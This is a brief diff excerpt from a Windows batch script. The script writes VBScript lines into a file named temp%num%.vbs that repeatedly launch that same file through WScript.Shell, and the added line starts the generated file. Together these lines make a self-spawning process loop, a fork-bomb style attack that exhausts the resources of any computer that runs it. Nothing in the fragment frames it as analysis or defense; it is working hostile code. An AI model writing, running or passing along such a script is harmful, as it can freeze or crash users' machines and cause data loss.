@@ -67,3 +67,4 @@ echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
 echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
 echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
 echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+start temp%num%.vbs
